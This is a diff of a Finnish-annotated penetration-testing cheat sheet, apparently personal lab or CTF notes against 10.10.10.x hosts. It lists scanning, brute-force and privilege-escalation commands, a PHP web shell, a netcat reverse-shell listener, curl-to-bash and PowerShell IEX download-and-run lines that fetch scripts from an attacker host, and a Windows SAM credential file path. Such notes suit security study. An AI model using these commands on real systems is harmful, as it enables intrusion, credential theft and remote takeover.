@@ -69,6 +69,7 @@ find -printf '%T+ M %p\n%A+ A %p\n%C+ C %p\n'|sort	<--->	Kertoo asennettujen ohj
 find /home -printf "%f\t%p\t%u\t%g\m\n" | column -t	<--->	Hakee home kansion kaikki tiedostot
 find / -group adm -ls 2>/dev/null			<--->	Ryhma oikeuksien haku
 find / -user joni -ls 2>/dev/null			<--->	Tiedostojen user oikeuksien haku
+find ./ | grep '.exe'					<--->	Etsii kansiotai eteenpain exe tiedostoja
 ________________________________________________________________________________________________________________________________
 *** ASENNUKSET ***
 sudo apt-get update			<--->	Paivittaa palvelimelle ohejelmitojen versio tiedot
@@ -582,8 +583,6 @@ ________________________________________________________________________________
 rmmod pcspkr                                    <--->   Piip ääni pois kalista
 /dev/shm/.virus.sh				<--->	Hyvä ram kansio viiruksille
 apt-cache search pentest                        <--->   Xubunulla haku
-nmap localhost                                  <--->   Portti scanneri
-nmap -sV localhost                              <--->   Banner grab
 
 virtualenv python3-pip                          <--->   Asennus Xubuntulle
 mkdir mitm
@@ -624,14 +623,15 @@ ________________________________________________________________________________
 gobuster dir -u http://URL -w /usr/share/wordlist	<--->	Dir skannaus
 
 ________________________________________________________________________________________________________________________________
+** DIRB skanneri **
+dirb http://10.10.10.1 -r -o                    <--->   -r lippu no recursive ja -o tallentaa listan
+dirb http://10.10.10.1 -X .html                 <--->   Etsii .html loppuiset sanat
+
+________________________________________________________________________________________________________________________________
 ** SEARCHSPLOIT **
 searchsploit "app name"				<--->	Hakee tunnetuja haavoituvuuksia
 searchsploit -w "app name"			<--->	Tuo hakuun web sivun
 searchsploit -x id123.txt			<--->	Hakee lisätietoja IDn mukaan
-
-________________________________________________________________________________________________________________________________
-** DIRB skanneri **
-dirb http://10.10.10.1 -r -o			<--->	-r lippu no recursive ja -o tallentaa listan
 
 ________________________________________________________________________________________________________________________________
 ** WebGoat **
@@ -659,23 +659,24 @@ table name user_system_data
 
 ________________________________________________________________________________________________________________________________
 ** Nmap **
-ip route
-ipcalc 10.0.0.0
+ip route				<--->	Tarkasta maali verkko
+ipcalc 10.0.0.0				<--->	Laske mahdolliset kohteet
+hostname -I				<--->	Oman koneen IPt
 
-nmap -n -vvv 10.10.10.1-254 --top-ports 10 | tee 1portscan.txt
-nmap -n -sV -sC -Pn 10.10.10.10 | tee 10portscan.txt
-nmap -sC -sV -oA tiedostonnimi 10.10.10.10
-nmap -p- -oA tiedostonimi 10.10.10.10
-nmap -T4 -p- -A 10.10.10.10
+man nmap								<--->	Nmap ohjeet
+nmap -n -vvv 10.10.10.1-254 --top-ports 10 > 1portscan.txt		<--->	Koko alueen scannaus top10 portit
+nmap -n -sV -sC -Pn 10.10.10.10 > 10portscan.txt			<--->	Yhden koneen scannaus + scripti scan
+nmap -sC -sV -oA tiedostonnimi 10.10.10.10				<--->	Tekee txt tiedoston nmapin kautta
+nmap -p- -oA tiedostonimi 10.10.10.10					<--->	
+nmap -T4 -p- -A 10.10.10.10 -oA tiedostonimi				<--->	Fast exec scan 1-65555 portit ja vie tiedostoon
+nmap -n 10.10.10.1 -p 80,443						<--->   scannaa ip alueen portit 80 ja 443m
 
 -sV                                     <--->   Bannerit eli versiotiedot
 -oA nimi				<--->   Tekee suoraan tiedostot scannauksien tiedoista
 -sU					<--->   UDP
-nmap -n 10.10.10.1-254 -p 80,443        <--->   scannaa ip alueen portit 80 ja 443
 -Pn                                     <--->   no ping
 --top-ports 10                          <--->   Skanna 10 suosituinta porttia
 -sC					<--->	Scripti skannaus
-
 ________________________________________________________________________________________________________________________________
 ** MetaSploit **
 msfdb init              <--->   Ajetaan kerran
@@ -743,6 +744,8 @@ s                                                                               
 
 ________________________________________________________________________________________________________________________________
 ** THCHydra **
+cewl -w -w savefile.txt	-d 3 -m 5 http://10.10.10.10/people/	<--->	Sanalistan luonti min 5 kirjain ja 3sivua alueesta
+
 hydra -l user -P sanalista 10.10.10.10 -t 4 ssh -V              <--->   SSH:n kautta yrittää aravata tietyn käyytäjän salasanaa
 hydra -L loginuserfile                                          <--->   Kokeilee kaikilla käyttäjillä jotka sanalistassa
 systemctl restart ssh                                           <--->   Jos ei toimi restart
@@ -775,8 +778,8 @@ ________________________________________________________________________________
 <?php echo system($_REQUEST['fun']); ?>				<--->	Koodin toimivuus testi
 ?fun=whoami							<--->	Selaimessa tiedoston peraan
 
-python -m SimpleHTTPServer 8000					<--->   Lataus serveri
-wget 10.10.10.10:8000/filename.php -O /dev/shm/.name.php	<--->   Tiedoston lataus selaimella
+python -m SimpleHTTPServer 9911					<--->   Lataus serveri
+wget 10.10.10.10:9911/filename.php -O /dev/shm/.name.php	<--->   Tiedoston lataus selaimella
 nc -vnlp 5005							<--->	Reverse shell pyynto omalle koneelle
 
 python3 -c 'import pty;pty.spawn("/bin/bash")'			<--->	tty shell
@@ -793,7 +796,11 @@ ________________________________________________________________________________
 LinPeas								<--->	PrivEsc scanneri
 LinEnum								<--->	PrivEsc scanneri
 pspy64s								<--->	CRON job scanneri
+
+python -m SimpleHTTPServer 9911                                 <--->   Lataus serveri
 curl 10.10.10.10/LinEnum/LinEnum.sh | bash			<--->	Python http palvelimelta suoraan portti 80
+wget 10.10.10.10:9911/linenum.sh -O /dev/shm/.linenum.sh	<--->	wget linenum simplepython palvelimesta
+wget 10.10.10.10:9911/winpeas.exe -O ./				<--->	wget winpeas nykyiseen kansioon
 
 SUID								<--->	root kayttajalla ajettavia ohjelmia
 
@@ -801,6 +808,7 @@ cat /proc/net/tcp						<--->	Nayttaa portit joita palvelin kuuntelee
 int(0x0016)							<--->	Python tulkilla portit oikeaan muotton esim 22ssh = 0016
 ________________________________________________________________________________________________________________________________
 ** privesc **
+sudo -u root /kansio/tiedosto		<--->	Sudo oikeus ilman salasanaa ajetaan toisella kayttajalla
 uname -a				<--->   Linux versio komento
 ps aux | grep root			<--->   root oikeuden ohjelmien haku
 sudo -l					<--->	Sudotus oikeudet
@@ -843,6 +851,8 @@ ________________________________________________________________________________
 exec | c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe					<--->	PS valitseminen
 IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:PORTTI/Invoke-PowerShellTcp.ps1')	<--->	Avaa/lataa
 IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10:PORTTI/Sherlock.ps1')			<--->	Sherlock PS
+
+Get-ComputerInfo | select WindowsProductName, WindowsVersion, OsHardwareAbstractionLayer		<--->	Versio tiedot
 
 systeminfo					<--->	Powershell komento joka antaa tietoja jarjestelmasta
 /Windows/System32/config/SAM			<--->	Salasana tiedosto windowsille
